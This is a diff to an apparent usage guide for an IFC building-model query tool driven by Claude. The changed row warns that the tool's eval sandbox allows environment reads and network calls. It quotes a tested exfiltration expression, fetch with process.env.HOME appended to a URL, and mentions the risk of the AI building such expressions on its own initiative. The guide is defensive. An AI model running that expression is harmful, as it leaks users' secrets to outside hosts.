@@ -113,7 +113,7 @@ What door widths exist and how many of each?
 | "How many rooms?" | "How many **spaces**?" | Revit's IFC export uses `IfcSpace`, not `IfcRoom` — "rooms" silently returns 0 |
 | "Count all elements" / "how many elements total" | A specific named type, e.g. "how many columns?" | Vague aggregate phrasing maps to the wrong recipe and returns a meaningless number, not an error |
 | "What's the window-wall ratio / total wall area?" | "What's the total **floor** area?" | Wall/window area quantity sets are often missing from real exports; floor area reliably works |
-| Any raw `eval` expression you don't already know works | Stick to `ask` phrases | `eval`'s sandbox allows `process.env` reads and live `fetch()` calls — don't let Claude construct eval expressions from arbitrary input live |
+| Any raw `eval` expression you don't already know works | Stick to `ask` phrases | **Proven, not theoretical**: `fetch('http://.../?leak=' + process.env.HOME)` inside `eval` successfully exfiltrated a real env var to a local listener in testing — confirmed end-to-end, request actually arrived. A free-text request like "filter walls where Mark = 'A-001'" is fine (Claude builds a harmless `.where(...)` query). The risk is if Claude ever decides to "test something" by building an expression that touches `process.env` or `fetch` on its own initiative. **Rule: never prompt Claude to construct an `eval` expression live; if a question needs more than an `ask` recipe, write the exact `eval` string yourself in advance and have Claude just run it verbatim.** |
 
 **If a count looks lower than he expects**: before assuming anything is broken,
 check for `IfcBuildingElementProxy` — confirmed today that generic/custom elements
